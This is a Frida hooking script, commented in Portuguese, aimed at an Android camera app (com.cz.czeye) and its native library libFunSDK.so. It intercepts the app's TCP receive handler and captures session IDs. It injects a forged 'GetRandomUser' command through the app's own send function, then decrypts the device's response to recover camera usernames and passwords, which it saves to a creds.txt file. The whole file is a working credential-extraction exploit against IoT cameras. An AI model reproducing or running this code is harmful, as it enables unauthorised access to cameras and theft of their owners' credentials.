/*
 * zz-tcpuser.js — leve e estável. Hooka SÓ CXTCPObject::OnRecvData (dispara
 * apenas nos dados do :6611) e injeta GetRandomUser chamando CXTCPObject::SendData
 * (envio limpo pelo próprio app). Decifra o Info com Fun_DecDevRandomUserInfo.
 * Saída: files/creds.txt
 */
(function () {
  var LIB = "libFunSDK.so", OUT = "/data/data/com.cz.czeye/files/creds.txt";
  function save(l){ console.log("[tu] "+l.substring(0,180)); try{var f=new File(OUT,"a");f.write(l+"\n");f.flush();f.close();}catch(e){} }
  save("LOADING tcpuser");
  var SNS = ["SN_CAMERA_1","SN_CAMERA_2","SN_CAMERA_3"];
  var done = {}, decd = {};
  var sendData = null, decFn = null;
  try {
    sendData = new NativeFunction(Module.findExportByName(LIB,"_ZN11CXTCPObject8SendDataEPKcii"), "int", ["pointer","pointer","int","int"]);
    decFn = new NativeFunction(Module.findExportByName(LIB,"_Z24Fun_DecDevRandomUserInfoPKcS0_Pc"), "int", ["pointer","pointer","pointer"]);
    save("SendData+dec OK");
  } catch(e){ save("ERRO init: "+e); }

  function frame(json, sid, msgid, seq){
    var body=[]; for(var i=0;i<json.length;i++) body.push(json.charCodeAt(i)&0xff); body.push(0);
    var n=body.length;
    var h=[0xFF,1,0,0, sid&0xff,(sid>>8)&0xff,(sid>>16)&0xff,(sid>>24)&0xff, seq&0xff,(seq>>8)&0xff,(seq>>16)&0xff,(seq>>24)&0xff,0,0, msgid&0xff,(msgid>>8)&0xff, n&0xff,(n>>8)&0xff,(n>>16)&0xff,(n>>24)&0xff];
    var all=h.concat(body); var buf=Memory.alloc(all.length); buf.writeByteArray(all); return {ptr:buf,len:all.length};
  }
  function scan(buf,n){ try{var b=buf.readByteArray(n); if(!b)return null; var u=new Uint8Array(b),s=""; for(var i=0;i<u.length;i++)s+=String.fromCharCode(u[i]); return s;}catch(e){return null;} }
  function decrypt(info){
    SNS.forEach(function(sn){ try{
      var out=Memory.alloc(512); out.writeByteArray(new Array(512).fill(0));
      var r=decFn(Memory.allocUtf8String(sn), Memory.allocUtf8String(info), out);
      var s=null; try{s=out.readUtf8String();}catch(e){}
      if(r===0 && s && /p1:|p2:/.test(s)) save("CREDS SN="+sn+"  "+s);
    }catch(e){} });
  }

  var oa = Module.findExportByName(LIB,"_ZN11CXTCPObject10OnRecvDataEPcii");
  if(!oa){ save("NAO achei OnRecvData"); return; }
  Interceptor.attach(oa, {
    onEnter: function(a){
      this.self=a[0]; var len=a[2].toInt32(); if(len<20||len>65536) return;
      var buf=a[1];
      try{ if(buf.readU8()!==0xFF) return; }catch(e){ return; }
      var s=scan(buf,len); if(!s) return;
      if(s.indexOf("AliveInterval")>=0 && s.indexOf("SessionID")>=0){
        var m=s.match(/"SessionID"\s*:\s*"?(0x[0-9a-fA-F]+)"?/);
        var key=this.self.toString()+(m?m[1]:"");
        if(m && sendData && !done[key]){ done[key]=1;
          var sidNum=parseInt(m[1],16);
          var f=frame('{"Name":"GetRandomUser","SessionID":"'+m[1]+'"}', sidNum, 1660, 600);
          var r=sendData(this.self, f.ptr, f.len, 0);
          save("login admin SID="+m[1]+" -> SendData GetRandomUser ret="+r);
        }
      }
      var mi=s.match(/"Info"\s*:\s*"([A-Za-z0-9+/=]+)"/);
      if(mi && !decd[mi[1]]){ decd[mi[1]]=1; save("INFO "+mi[1]); decrypt(mi[1]); }
    }
  });
  save("ARMED tcpuser — abra f5332/9a07 no app");
})();
